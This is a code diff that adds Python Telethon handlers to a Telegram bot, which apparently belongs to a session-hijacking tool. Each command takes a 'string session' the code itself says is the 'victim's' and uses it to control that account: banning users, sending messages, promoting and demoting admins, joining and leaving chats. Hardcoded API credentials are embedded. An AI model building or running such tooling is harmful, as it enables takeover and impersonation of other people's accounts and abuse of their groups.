@@ -328,3 +328,175 @@ async def _(event):
     except Exception as e:
       eror = str(e)
       await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)
+
+
+
+##############################################################################################################################
+
+
+
+################################################## CHAT GEAR #################################################################
+
+
+
+##############################################################################################################################
+
+
+
+
+@BotClient.on(events.NewMessage(incoming=True, pattern="^/ban(?: |$)(.*)"))
+async def _(event):
+  if event.sender_id not in session.keys():
+    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
+  else:
+    try:
+      mat = str(event.text[5:])
+      lst = mat.split(" ", 1)
+      cht = int(lst[0])
+      usr = str(lst[1])
+      string = session[event.sender_id]
+      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+        result = await victim.get_participants(mat)
+        if not result:
+          return await event.reply("It seems like victim is not admin in that group.")
+        if usr not in result:
+          return await event.reply("User isn't in that chat bruhh!")
+        admins = await victim.get_participants(mat, filter=ChannelParticipantsAdmins)
+        admins_id = [i.id for i in admins]
+        if usr not in admins_id:
+          try:
+            await victim(EditBannedRequest(cht, usr, ChatBannedRights(until_date=None,view_messages=True)))
+            await event.reply("**Banned user successfully!!**")
+          except:
+            await event.reply("**OOPS!! Something went wrong!!**\n\n**I am unable to ban that user from that chat!!**")
+         
+    except Exception as e:
+      eror = str(e)
+      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)
+
+
+@BotClient.on(events.NewMessage(incoming=True, pattern="^/send(?: |$)(.*)"))
+async def _(event):
+  if event.sender_id not in session.keys():
+    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
+  else:
+    try:
+      mat = str(event.text[6:])
+      dat = mat.split(" ", 1)
+      cht = int(dat[0])
+      msg = dat[1]
+      string = session[event.sender_id]
+      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+        await victim.send_message(cht, msg)
+      await event.reply("**Sent message successfully!!**")
+    except Exception as e:
+      eror = str(e)
+      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)
+
+
+@BotClient.on(events.NewMessage(incoming=True, pattern="^/promote(?: |$)(.*)"))
+async def _(event):
+  if event.sender_id not in session.keys():
+    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
+  else:
+    try:
+      mat = str(event.text[9:])
+      dat = mat.split(" ", 2)
+      chat = int(dat[0])
+      user = str(dat[1])
+      if user.isdigit() or user[0] != '@':
+        return await event.reply(":Wrong Syntax:\nUse /help command to know syntax.")
+      if len(dat) == 3:
+        rank = str(dat[2])
+      else:
+        rank = "Admin"
+      string = session[event.sender_id]
+      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+        await victim.edit_admin(chat, user, is_admin=True, anonymous=False, title= rank)
+      await event.reply("**Promoted successfully!!**")
+    except Exception as e:
+      eror = str(e)
+      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)
+
+
+
+
+@BotClient.on(events.NewMessage(incoming=True, pattern="^/demote(?: |$)(.*)"))
+async def _(event):
+  if event.sender_id not in session.keys():
+    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
+  else:
+    try:
+      mat = str(event.text[8:])
+      dat = mat.split(" ", 1)
+      chat = int(dat[0])
+      user = str(dat[1])
+      if user.isdigit() or user[0] != '@':
+        return await event.reply(":Wrong Syntax:\nUse /help command to know syntax.")
+      string = session[event.sender_id]
+      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+        await victim.edit_admin(chat, user, is_admin=False)
+      await event.reply("**Demoted user successfully!!**")
+    except Exception as e:
+      eror = str(e)
+      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)
+
+
+@BotClient.on(events.NewMessage(incoming=True, pattern="^/join(?: |$)(.*)"))
+async def _(event):
+  if event.sender_id not in session.keys():
+    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
+  else:
+    try:
+      mat = str(event.text[6:])
+      string = session[event.sender_id]
+      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+        try:
+          await victim(functions.channels.JoinChannelRequest(channel=mat))
+          await event.reply("**Joined successfully!!**")
+        except:
+          await event.reply("**OOPS!! Something went wrong!!**\n\n**I guess the user is already there!!**")
+    except Exception as e:
+      eror = str(e)
+      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)
+
+
+@BotClient.on(events.NewMessage(incoming=True, pattern="^/pjoin(?: |$)(.*)"))
+async def _(event):
+  if event.sender_id not in session.keys():
+    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
+  else:
+    try:
+      mat = str(event.text[7:])
+      string = session[event.sender_id]
+      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+        try:
+          await victim(ImportChatInviteRequest(mat))
+          await event.reply("**Joined successfully!!**")
+        except:
+          await event.reply("**OOPS!! Something went wrong!!**\n\n**I guess the user is already there!!**")
+    except Exception as e:
+      eror = str(e)
+      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)
+
+
+@BotClient.on(events.NewMessage(incoming=True, pattern="^/leave(?: |$)(.*)"))
+async def _(event):
+  if event.sender_id not in session.keys():
+    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
+  else:
+    try:
+      mat = int(event.text[7:])
+      string = session[event.sender_id]
+      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+        try:
+          await victim(LeaveChannelRequest(mat))
+          await event.reply("**Left successfully!!**")
+        except:
+          await event.reply("**OOPS!! Something went wrong!!**\n\n**I guess the user is not there!!**")
+    except Exception as e:
+      eror = str(e)
+      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)
+
+
+
